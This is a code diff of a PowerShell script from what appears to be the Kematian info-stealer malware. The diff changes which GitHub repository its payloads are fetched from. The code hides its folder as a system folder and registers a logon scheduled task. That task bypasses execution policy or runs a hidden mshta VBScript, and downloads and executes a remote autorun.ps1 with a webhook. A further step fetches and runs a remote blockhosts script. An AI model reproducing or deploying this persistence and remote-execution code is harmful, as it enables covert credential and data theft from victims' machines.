@@ -80,10 +80,10 @@ function Invoke-TASKS {
         $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "Kematian"
         $task_action = if ($debug) {
-            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
+            New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/kcock25/Kematian-Stealer-V3/main/frontend-src/autorun.ps1 | iex`""
         }
         else {
-            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/ChildrenOfYahweh/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
+            New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/kcock25/Kematian-Stealer-V3/main/frontend-src/autorun.ps1')|iex`",0)(window.close)"
         }
         $task_trigger = New-ScheduledTaskTrigger -AtLogOn
         $task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
@@ -91,7 +91,7 @@ function Invoke-TASKS {
         Write-Host "[!] Persistence Added" -ForegroundColor Green
     }
     if ($blockhostsfile) {
-        $link = "https://github.com/ChildrenOfYahweh/Kematian-Stealer/raw/main/frontend-src/blockhosts.ps1"
+        $link = "https://github.com/kcock25/Kematian-Stealer-V3/raw/main/frontend-src/blockhosts.ps1"
         iex (iwr -Uri $link -UseBasicParsing)
     }
     Backup-Data
